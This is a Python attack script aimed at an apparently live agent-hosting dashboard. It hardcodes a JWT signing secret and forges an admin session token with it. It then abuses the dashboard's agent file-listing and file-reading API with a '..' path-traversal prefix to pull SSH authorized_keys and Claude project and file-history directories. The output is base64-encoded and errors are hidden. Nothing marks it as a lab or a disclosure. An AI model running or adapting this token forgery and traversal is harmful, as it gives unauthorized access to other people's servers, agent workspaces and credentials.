#!/usr/bin/env python3
import os, sys, json, base64, hmac, hashlib, subprocess, random, re
import urllib.parse as up
HOST="dashboard.lumiiai.cn"; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str); print("R:%s:%s"%(k,_b64(s)),flush=True)
def sh(a,timeout=90):
    try: r=subprocess.run(a,capture_output=True,timeout=timeout); return r.returncode,r.stdout.decode("utf-8","replace"),r.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
def curl(args,timeout=60): return sh(["curl","-s","-k","-m",str(timeout)]+args,timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def call(path,cookie,timeout=60,maxlen=4000000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-H","Cookie: session="+cookie,"-w","\n__CODE__%{http_code}","https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
K="/home/lumii/.lumii-agent-keeper/.."
def ls(aid,rel,tok,maxlen=30000): return call("/api/agents/%s/files?action=list&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
def rd(aid,rel,tok,maxlen=30000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
AID="agent-047f1d22"; TOK=forge({"userId":"fc7c3730-4219-11f1-ac43-525400595be1","email":"p@x","customer":"aro","role":"admin"})
def main():
    R("RAW_ls_proj", ls(AID,"/.claude/projects/-home-coder--lumii-runtime-home",TOK,maxlen=20000))
    R("RAW_ls_coder", ls(AID,"/.claude/projects/-home-coder",TOK,maxlen=12000))
    R("RAW_ak", rd(AID,"/.ssh/authorized_keys",TOK,maxlen=3000))
    R("RAW_ls_filehist", ls(AID,"/.claude/file-history/dbf4456d-2dfb-49b3-a174-16fdd51044ed",TOK,maxlen=20000))
try: main()
except Exception:
    import traceback; R("FATAL",traceback.format_exc()[-2000:])
finally: sys.exit(0)
